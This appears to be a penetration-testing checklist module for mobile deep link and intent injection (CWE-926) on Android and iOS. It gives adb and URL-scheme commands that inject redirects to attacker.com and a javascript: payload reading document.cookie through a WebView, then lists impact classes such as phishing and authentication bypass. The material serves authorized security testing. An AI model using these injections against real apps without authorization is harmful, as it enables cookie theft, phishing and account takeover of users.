# VULN MODULE — Deep Link & Intent Injection (Mobile)
# Asset: mobileapp (Android, iOS)
# CWE-926 | Report prefix: MOB-DEEP

## ANDROID — Intent & Deep Link Injection

```bash
# Find exported activities and deep link handlers in AndroidManifest.xml
grep -A10 "intent-filter" decompiled/AndroidManifest.xml | \
  grep -E "action|scheme|host|pathPrefix"

# Test deep link via ADB
adb shell am start -W -a android.intent.action.VIEW \
  -d "app://target/user?id=admin" com.target.app

# Intent injection via exported activity
adb shell am start -n com.target.app/.SettingsActivity \
  --es "redirect_url" "https://attacker.com"

# Check for WebView loading deep link URL without validation
adb shell am start -W -a android.intent.action.VIEW \
  -d "app://webview?url=javascript:alert(document.cookie)" com.target.app
```

## iOS — URL Scheme & Universal Links

```bash
# Find URL schemes in Info.plist
grep -A5 "CFBundleURLSchemes" ipa-extracted/Payload/App.app/Info.plist

# Test from another app or Safari:
# Open URL: targetapp://action?param=value
# Inject: targetapp://action?redirect=https://attacker.com

# Universal links — check apple-app-site-association
curl -s https://target.com/.well-known/apple-app-site-association
# Check: are paths properly restricted?
```

## IMPACT CLASSES

- WebView loads attacker URL via deep link → XSS / phishing in app context
- Authentication state bypassed via deep link → account access
- Redirect to attacker URL → credential phishing
- Sensitive action triggered (delete, purchase) → business logic abuse
